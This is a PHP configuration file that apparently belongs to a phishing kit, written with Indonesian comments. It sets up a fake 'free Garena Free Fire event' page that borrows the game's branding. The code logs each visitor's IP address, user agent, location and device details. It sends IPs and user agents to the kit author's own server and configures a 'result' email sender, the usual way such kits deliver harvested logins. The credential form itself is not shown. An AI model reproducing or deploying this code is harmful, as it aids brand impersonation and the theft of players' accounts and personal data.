<?php // SCRIPT BY ARPANTEK
// COPYRIGHT ITS ME ARPANTEK
// HARGAI W OK, JANGAN LO UBAH COPYRIGHT NYA
//KONTROL UNTUK DESKRIPSI HALAMAN
$title = 'FREE FIRE - Event Gratisan Garena';
$description = 'Event gratisan dari Garena sudah dimulai, ayo ambil item-item favorit kamu disini!';
$copyright = 'FREE FIRE';
$theme = '#000';
$image = 'https://i.ibb.co/y4BNtrv/season.png';
$icon = 'http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png';
//KONTROL UNTUK MENDAPATKAN ZONA WAKTU (WILAYAH JAKARTA)
date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');
//KONTROL UNTUK HALAMAN KIRIM RESULT
$author = 'AMFCODE';
$sender = 'From: IKHBAL JB NIH BOS <result@ikhbaljb.com>';
//MENDAPATKAN INFORMASI IP ADDRESS
class detail {
    function get_client_info() {
        $ipaddress = '';
        if (getenv('HTTP_CLIENT_IP')) $ipaddress = getenv('HTTP_CLIENT_IP');
        else if (getenv('HTTP_X_FORWARDED_FOR')) $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
        else if (getenv('HTTP_X_FORWARDED')) $ipaddress = getenv('HTTP_X_FORWARDED');
        else if (getenv('HTTP_FORWARDED_FOR')) $ipaddress = getenv('HTTP_FORWARDED_FOR');
        else if (getenv('HTTP_FORWARDED')) $ipaddress = getenv('HTTP_FORWARDED');
        else if (getenv('REMOTE_ADDR')) $ipaddress = getenv('REMOTE_ADDR');
        else $ipaddress = 'IP tidak dikenali';
        return $ipaddress;
    }
}
$detail = new detail();
$ipp = $detail->get_client_info();
//MENDAPATKAN INFORMASI USER AGENT
$ua = $_SERVER['HTTP_USER_AGENT'];
class curlni {
    //MENDAPATKAN INFORMASI KODE PANGGILAN NEGARA
    function geo($ipp) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.ipgeolocationapi.com/geolocate/$ipp");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $chresult = curl_exec($ch);
        curl_close($ch);
        $arpantek_cocode = json_decode($chresult, true);
        return $arpantek_cocode;
    }
    //MENDAPATKAN INFORMASI LOKASI
    function iplook($ipp) {
        $url = "https://extreme-ip-lookup.com/json/$ipp";
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        $data = curl_exec($ch);
        curl_close($ch);
        $arpantek_geo = json_decode($data, TRUE);
        return $arpantek_geo;
    }
    //MENDAPATKAN INFORMASI BENDERA NEGARA
    function bendera($ipp) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://arpanrizki.my.id/api/get_flag2/api.php");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "ip=$ipp");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $arpantexxx = curl_exec($ch);
        curl_close($ch);
        $exe = explode('-', $arpantexxx);
        $arpantek_flag = $exe[1];
        return $arpantek_flag;
    }
}
//MENDAPATKAN INFORMASI PERANGKAT
function devices($ua) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://arpanrizki.my.id/api/get_device/api.php");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "ua=$ua");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $arpantexxxd = curl_exec($ch);
    curl_close($ch);
    return $arpantexxxd;
}
//MENDAPATKAN HASIL INFORMASI PERANGKAT
$w = devices($ua);
//MEMISAHKAN HASIL INFORMASI PERANGKAT
$pecah1 = explode('Brand: ', $w);
$pecahLagi1 = explode('<br>', $pecah1[1]);
$brand = $pecahLagi1[0]; //MEREK PERANGKAT
$pecah2 = explode('Name: ', $w);
$pecahLagi2 = explode('<br>', $pecah2[1]);
$name = $pecahLagi2[0]; //MODEL PERANGKAT
$pecah3 = explode('OS: ', $w);
$pecahLagi3 = explode('<br>', $pecah3[1]);
$osname = $pecahLagi3[0]; //OPERASI SISTEM
$pecah4 = explode('Browser: ', $w);
$pecahLagi4 = explode('<br>', $pecah4[1]);
$browser = $pecahLagi4[0]; //BROWSER SISTEM
?>